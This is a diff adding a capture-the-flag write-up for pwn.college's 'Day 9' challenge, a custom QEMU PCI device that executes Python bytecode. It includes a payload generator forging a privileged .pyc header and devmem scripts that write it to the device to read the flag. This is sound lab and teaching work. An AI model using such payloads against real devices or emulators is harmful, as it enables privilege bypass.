@@ -1713,3 +1713,261 @@ $ curl -s -X POST -H "Content-Type: application/json" -d '{"stdin":"hello"}' htt
 
 {"returncode":0,"stderr":"","stdout":"soft hug!\nteddy keeps this secret: pwn.college{practice}\n"}
 ```
+
+## Day 9 - Custom Python bytecode processing unit
+
+<blockquote>
+  <p>This year, Santa decided you’ve been especially good and left you a shiny new Python Processing Unit (pypu) — a mysterious PCIe accelerator built to finally quiet all the elves who won’t stop grumbling that “Python is slow” 🐍💨. This festive silicon snack happily devours .pyc bytecode at hardware speed… but Santa forgot to include any userspace tools, drivers, or documentation for how to actually use it. 🎁 All you’ve got is a bare MMIO interface, a device that will execute whatever .pyc you can wrangle together, and the hope that you can coax this strange gift into revealing an extra gift. Time to poke, prod, reverse-engineer, and see what surprises your new holiday hardware is hiding under the tree. 🎄✨</p>
+</blockquote>
+
+This time the description for the challenge is quite useful to get an idea about what's hapening. We have the source code for this mysterious device, and it is loaded into QEMU by the `runs.h` script:
+```bash
+#!/usr/bin/exec-suid -- /bin/bash -p
+
+set -euo pipefail
+
+PATH="/challenge/runtime/qemu/bin:$PATH"
+
+qemu-system-x86_64 \
+  -machine q35 \
+  -cpu qemu64 \
+  -m 512M \
+  -nographic \
+  -no-reboot \
+  -kernel /challenge/runtime/bzImage \
+  -initrd /challenge/runtime/rootfs.cpio.gz \
+  -append "console=ttyS0 quiet panic=-1" \
+  -device pypu-pci \
+  -serial stdio \
+  -monitor none
+```
+
+### Understanding the challenge
+
+We're dealing with a custom virtual hardware device called `pypu-pci` (Python Processing Unit). The content of `/flag` from the host machine is read into the `PypuPCIState->flag` buffer. The challenge is to read this buffer from the guest VM. The device is essentially a Python bytecode interpreter that runs code provided by the guest OS:
+* The guest OS writes Python bytecode (`.pyc`) into the `state->code` buffer (via MMIO writes to addresses starting at 0x100).
+* The guest OS sets the length of the code (`state->code_len`).
+* The guest OS triggers execution by writing to the special register at address 0x0c (which increments `state->greet_count`).
+* The code is executed in a separate thread (`python_worker` function), which calls `execute_python_code()`).
+
+The `gifts` module is added to `sys.modules`. This module contains the object holding the flag:
+```python
+PyObject *flag_val = PyUnicode_FromString(state->flag);
+if (PyModule_AddObject(gifts_module, "flag", flag_val) < 0) { ... }
+```
+
+If we are privileged, we can `import gifts` and access `gifts.flag`.
+
+### Ineracting with the device
+
+We know it's a PCI device so let's identify it:
+```bash
+# lspci
+00:1f.2 Class 0106: 8086:2922
+00:1f.0 Class 0601: 8086:2918
+00:01.0 Class 0300: 1234:1111
+00:1f.3 Class 0c05: 8086:2930
+00:00.0 Class 0600: 8086:29c0
+00:03.0 Class 00ff: 1337:1225
+00:02.0 Class 0200: 8086:10d3
+```
+
+The output from `lspci` confirms the location of the custom device (notice the 1337 - l33t, and 1225 - xmas markers):
+```bash
+00:03.0 Class 00ff: 1337:1225
+Bus Address: 00:03.0 (Bus 0, Device 3, Function 0).
+```
+
+This exactly matches the values set in `src/pypu-pci.c`:
+```c
+pci_config_set_vendor_id(pdev->config, 0x1337);
+pci_config_set_device_id(pdev->config, 0x1225);
+```
+
+Find out the Base BAR (Address Registers) addresses:
+```bash
+$ cat /sys/bus/pci/devices/0000:00:03.0/resource
+0x00000000febd5000 0x00000000febd5fff 0x0000000000040200
+0x00000000febd6000 0x00000000febd6fff 0x0000000000040200
+0x00000000febd7000 0x00000000febd7fff 0x0000000000040200
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+```
+
+And finally veirfy that we can read from it successfuly:
+```
+$ devmem 0xfebd5000 32
+0x50595055  (ASCII for "PYPU")
+```
+
+Which matches the logic from the `pypu-pci.c` source file:
+```c
+
+static uint64_t pypu_mmio_read(void *opaque, hwaddr addr, unsigned size)
+{
+    PypuPCIState *state = opaque;
+
+    if (addr == 0x00 && size == 4) {
+        return 0x50595055ull; /* "PYPU" */
+    }
+	[..]
+```
+
+According to the source code, the challenge expects Python 3.13 bytecode (as proven by the `0xf30d0d0a` value below), and Santa was nice enough to include a couple of examples on the guest VM too:
+
+```bash
+# ls -al pypu_programs/
+total 8
+drwxr-xr-x    2 0        0               80 Dec  8 23:53 .
+drwxr-xr-x   11 0        0              280 Dec 17 22:25 ..
+-rw-r--r--    1 0        0              261 Dec  8 23:53 giftless.pyc
+-rw-r--r--    1 0        0              177 Dec  8 23:53 privileged_peek_gift.pyc
+
+$ cat /pypu_programs/privileged_peek_gift.pyc | xxd -g 1
+00000000: f3 0d 0d 0a 03 00 00 00 d3 9d bc 75 1a 10 a0 f0  ...........u....
+00000010: e3 00 00 00 00 00 00 00 00 00 00 00 00 03 00 00  ................
+00000020: 00 00 00 00 00 f3 1c 00 00 00 95 00 53 00 53 01  ............S.S.
+00000030: 4b 00 72 00 5c 01 22 00 5c 00 35 01 00 00 00 00  K.r.\.".\.5.....
+00000040: 00 00 20 00 67 01 29 02 e9 00 00 00 00 4e 29 02  .. .g.)......N).
+00000050: da 05 67 69 66 74 73 da 05 70 72 69 6e 74 a9 00  ..gifts..print..
+00000060: f3 00 00 00 00 da 1e 2f 62 75 69 6c 64 2f 70 72  ......./build/pr
+00000070: 69 76 69 6c 65 67 65 64 5f 70 65 65 6b 5f 67 69  ivileged_peek_gi
+00000080: 66 74 2e 70 79 da 08 3c 6d 6f 64 75 6c 65 3e 72  ft.py..<module>r
+00000090: 08 00 00 00 01 00 00 00 73 0f 00 00 00 f0 03 01  ........s.......
+000000a0: 01 01 db 00 0c d9 00 05 80 65 85 0c 72 06 00 00  .........e..r...
+000000b0: 00       
+```
+
+### Get the flag
+
+To get the flag we need to understand a couple of things:
+* How to construct a .pyc payload accepted by the challenge
+* How to write to the PCI device
+* How to read from the PCI device
+* Overcome any additional suprises along the way
+
+Since I didn't find the Python 3.13 binary quickly on the VM, I generated a payload to import the gifts module and print the flag locally:
+```python
+import struct
+import base64
+import marshal
+import binascii
+import importlib.util
+
+# Grab the magic number of the current interpreter (Must be 3.13!)
+magic_number = importlib.util.MAGIC_NUMBER
+print("[*] Magic number: ", binascii.hexlify(magic_number))
+
+# Pack the privileged hash (from pypu-privileged.h) 
+PYPU_PRIVILEGED_HASH = 0xf0a0101a75bc9dd3
+privileged_hash = struct.pack("<Q", PYPU_PRIVILEGED_HASH)
+
+# Exploit code
+code_str = "import gifts; print(f'FOUND_FLAG: {gifts.flag}')"
+code_obj = compile(code_str, "<string>", "exec")
+marshalled_code = marshal.dumps(code_obj)
+
+# [Magic (4b)] + [Flags (4b)] + [Hash (8b)] + [Bytecode (var)]
+payload = magic_number + b"\x00\x00\x00\x00" + privileged_hash + marshalled_code
+
+# Output the results for the Guest VM
+b64_payload = base64.b64encode(payload).decode()
+size = len(payload)
+
+print(f"[*] Payload Size: {size}")
+print(f"[*] Base64 payload:\n{b64_payload}")
+```
+
+The transferred it to the guest VM:
+```bash
+~ python3 pypu-payload.py
+[*] Magic number:  b'f30d0d0a'
+[*] Payload Size: 212
+[*] Base64 payload:
+8w0NCgAAAADTnbx1GhCg8OMAAAAAAAAAAAAAAAAEAAAAAAAAAPM2AAAAlQBTAFMBSwByAFwBIgBTAlwAUgQAAAAAAAAAAAAAAAAAAAAAAAAOADMCNQEAAAAAAAAgAGcBKQPpAAAAAE56DEZPVU5EX0ZMQUc6ICkD2gVnaWZ0c9oFcHJpbnTaBGZsYWepAPMAAAAA2gg8c3RyaW5nPtoIPG1vZHVsZT5yCQAAAAEAAABzGgAAAPADAQEB2wAMiWWQbKA1pzqhOqAs0BQv1Q4wcgcAAAA=
+
+# echo '8w0NCgAAAADTnbx1...AA=' | base64 -d > p.bin
+```
+
+To write the payload to the PCI device I used the following bash script that writes one byte at a time (_all other attempts to write in bigger chunks failed!_):
+```bash
+# File containining the Python bytecode
+FILE="p.bin"
+BASE_ADDR=0xfebd5100 # BAR0 + 0x100
+
+# Convert p.bin to a list of hex bytes and write them one by one
+i=0
+for byte in $(od -An -t x1 -v "$FILE"); do
+    # Use devmem in 8-bit mode
+    devmem $((BASE_ADDR + i)) 8 "0x$byte"
+    i=$((i + 1))
+done
+```
+
+And to read its output (both stdout and stderr):
+```bash
+#!/bin/sh
+
+# BAR Addresses
+STDOUT_BAR=0xfebd6000
+STDERR_BAR=0xfebd7000
+
+read_bar() {
+    local base=$1
+    local name=$2
+    printf "[*] Reading %s\n" "$name"
+    
+    for i in $(seq 0 255); do
+        # Get the hex value (e.g., 0x41)
+        val=$(devmem $((base + i)) 8)
+        
+        # Stop if we hit a null byte (end of string)
+        if [ "$val" = "0x00" ]; then
+            break
+        fi
+        
+        # Convert hex to octal for printf
+        octal_val=$(printf '%o' "$val")
+        printf "\\$octal_val"
+    done
+    printf "\n\n"
+}
+
+# Execute reads
+read_bar $STDOUT_BAR "STDOUT (BAR 1)"
+read_bar $STDERR_BAR "STDERR (BAR 2)"
+```
+
+To trigger the execution of the payload, we need to set the exact length of the payload and trigger the Python worker thread:
+```bash
+# vi pypu-write.sh
+# chmod +x pypu-write.sh
+
+# vi pypu-read.sh
+# chmod +x pypu-read.sh
+
+# Write the payload
+# ./pypu-write.sh
+
+# Set the exact length of the bytecode
+~ # devmem 0xfebd5010 32 212
+
+# Triger the execution
+# devmem 0xfebd500c 32 1
+
+# Read stdout/stderr
+# ./pypu-read.sh
+[*] Reading STDOUT (BAR 1)
+FOUND_FLAG: pwn.college{g67jNvYwczJ3iXJDI8KMmPyi2Ha.QX4UTMyIDLzQDMyQzW}
+[*] Reading STDERR (BAR 2)
+```
+
+## Day 10 -
